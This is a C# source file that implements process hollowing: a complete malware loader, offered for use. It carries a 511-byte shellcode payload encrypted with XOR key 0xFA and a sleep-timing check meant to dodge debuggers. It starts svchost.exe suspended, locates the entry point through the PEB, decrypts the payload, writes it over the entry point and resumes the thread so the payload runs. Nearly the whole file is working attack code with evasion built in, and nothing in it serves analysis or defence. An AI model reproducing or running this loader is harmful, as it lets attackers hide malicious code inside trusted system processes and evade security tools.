using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        // Constants used for process creation and querying process information
        public const uint CREATE_SUSPENDED = 0x4; // Flag to create a process in a suspended state
        public const int PROCESSBASICINFORMATION = 0; // Process information class for basic information

        // Structure to hold process information
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess; // Handle to the process
            public IntPtr hThread; // Handle to the primary thread of the process
            public int ProcessId;  // Process ID
            public int ThreadId;   // Thread ID
        }

        // Structure for specifying process startup details
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb; // Size of the structure
            public string lpReserved;
            public string lpDesktop; // Desktop associated with the process
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput; // Standard input handle
            public IntPtr hStdOutput; // Standard output handle
            public IntPtr hStdError; // Standard error handle
        }

        // Structure representing basic process information
        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress; // Address of the Process Environment Block (PEB)
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid; // Unique Process ID
            public IntPtr MoreReserved;
        }

        // Import Windows API function for sleeping
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // Import Windows API function for creating processes
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo,
            out ProcessInfo lpProcessInformation);

        // Import Windows API function for querying process information
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref ProcessBasicInfo procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        // Import Windows API function for reading memory of a process
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfbytesRW);

        // Import Windows API function for writing to a process's memory
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        // Import Windows API function for resuming a thread
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // Anti-debugging mechanism: Check if the sleep duration is interrupted (e.g., by a debugger)
            DateTime startTime = DateTime.Now;
            Sleep(10000); // Sleep for 10 seconds
            double elapsedSeconds = DateTime.Now.Subtract(startTime).TotalSeconds;
            if (elapsedSeconds < 9.5)
            {
                Console.WriteLine("Potential debugging detected. Exiting...");
                return;
            }

            // Shellcode payload (XOR encrypted with key 0xFA)
            byte[] buf = new byte[511] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
0x71, 0xa8, 0xda, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xbb, 0xab, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xb2,
0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xaa, 0xbe,
0x71, 0xba, 0xda, 0x71, 0xb2, 0xe2, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2,
0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0xbb, 0x3b, 0x33,
0xf7, 0x56, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
0xbb, 0xa2, 0xa4, 0xa3, 0xb2, 0xfb, 0x2a, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb3, 0x44, 0x8d, 0x89, 0xc8, 0xa5, 0xc9, 0xc8, 0xfa, 0xfa,
0xbb, 0xac, 0xb3, 0x73, 0x1c, 0xb2, 0x7b, 0x16, 0x5a, 0xfb, 0xfa, 0xfa, 0xb3, 0x73, 0x1f,
0xb3, 0x46, 0xf8, 0xfa, 0xfb, 0x41, 0x3a, 0x52, 0xa7, 0x7a, 0xbb, 0xae, 0xb3, 0x73, 0x1e,
0xb6, 0x73, 0x0b, 0xbb, 0x40, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xb6, 0x73, 0x10, 0x92,
0xfb, 0xfb, 0xfa, 0xfa, 0xa3, 0xbb, 0x40, 0xd3, 0x7a, 0x91, 0xfa, 0x05, 0x2f, 0x90, 0xf0,
0xbb, 0xa4, 0xaa, 0xaa, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x3a, 0xb2, 0x05, 0x3a, 0xb2, 0x73,
0x38, 0xb2, 0x05, 0x3a, 0xb2, 0x73, 0x3b, 0xbb, 0x40, 0x10, 0xf5, 0x25, 0x1a, 0x05, 0x2f,
0xb2, 0x73, 0x3d, 0x90, 0xea, 0xbb, 0xa2, 0xb6, 0x73, 0x18, 0xb2, 0x73, 0x03, 0xbb, 0x40,
0x63, 0x5f, 0x8e, 0x9b, 0x05, 0x2f, 0x7f, 0x3a, 0x8e, 0xf0, 0xb3, 0x05, 0x34, 0x8f, 0x1f,
0x12, 0x69, 0xfa, 0xfa, 0xfa, 0xb2, 0x79, 0x16, 0xea, 0xb2, 0x73, 0x18, 0xb7, 0xcb, 0x33,
0x90, 0xfe, 0xbb, 0xa2, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32, 0xa5, 0x05, 0x2f,
0x79, 0x02, 0xfa, 0x84, 0xaf, 0xb2, 0x79, 0x3e, 0xda, 0xa4, 0x73, 0x0c, 0x90, 0xba, 0xbb,
0xa3, 0x92, 0xfa, 0xea, 0xfa, 0xfa, 0xbb, 0xa2, 0xb2, 0x73, 0x08, 0xb2, 0xcb, 0x33, 0xbb,
0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0x05, 0x2f, 0xb2, 0x73, 0x39, 0xb3, 0x73, 0x3d, 0xb7, 0xcb,
0x33, 0xb3, 0x73, 0x0a, 0xb2, 0x73, 0x20, 0xb2, 0x73, 0x03, 0xbb, 0x40, 0xf8, 0x23, 0x32,
0xa5, 0x05, 0x2f, 0x79, 0x02, 0xfa, 0x87, 0xd2, 0xa2, 0xbb, 0xad, 0xa3, 0x92, 0xfa, 0xba,
0xfa, 0xfa, 0xbb, 0xa2, 0x90, 0xfa, 0xa0, 0xbb, 0x40, 0xf1, 0xd5, 0xf5, 0xca, 0x05, 0x2f,
0xad, 0xa3, 0xbb, 0x40, 0x8f, 0x94, 0xb7, 0x9b, 0x05, 0x2f, 0xb3, 0x05, 0x34, 0x13, 0xc6,
0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
0x05, 0x1d, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05,
0x2f};

            // Create a suspended process for 'svchost.exe'
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool processCreated = CreateProcess(
                null,
                "c:\\windows\\system32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref sInfo,
                out pInfo);
            Console.WriteLine($"Created suspended process 'svchost.exe' with PID {pInfo.ProcessId}. Success: {processCreated}.");

            // Query process information to retrieve the PEB address
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            int queryResult = ZwQueryInformationProcess(
                pInfo.hProcess,
                PROCESSBASICINFORMATION,
                ref pbInfo,
                (uint)(IntPtr.Size * 6),
                ref retLen);
            IntPtr baseImageAddress = (IntPtr)((long)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"PEB located at address: 0x{baseImageAddress.ToString("x")}");

            // Read the process's executable base address from the PEB
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRead;
            bool readResult = ReadProcessMemory(
                pInfo.hProcess,
                baseImageAddress,
                procAddr,
                procAddr.Length,
                out bytesRead);
            IntPtr executableBaseAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);

            // Read the memory of the executable to locate the entry point
            readResult = ReadProcessMemory(
                pInfo.hProcess,
                executableBaseAddress,
                dataBuf,
                dataBuf.Length,
                out bytesRead);
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c); // Offset to the PE header
            uint rvaOffset = e_lfanew + 0x28; // Offset to the entry point RVA
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            IntPtr entryPointAddress = (IntPtr)((long)executableBaseAddress + rva);

            // Decode the XOR encrypted payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ 0xFA); // XOR decryption
            }
            Console.WriteLine("Payload decrypted successfully.");

            // Overwrite the entry point with the payload
            bool writeResult = WriteProcessMemory(
                pInfo.hProcess,
                entryPointAddress,
                buf,
                buf.Length,
                out bytesRead);
            Console.WriteLine($"Entry point overwritten. Success: {writeResult}.");

            // Resume the thread to execute the payload
            uint resumeResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Process resumed. Payload executed. Success: {resumeResult == 1}.");
        }
    }
}
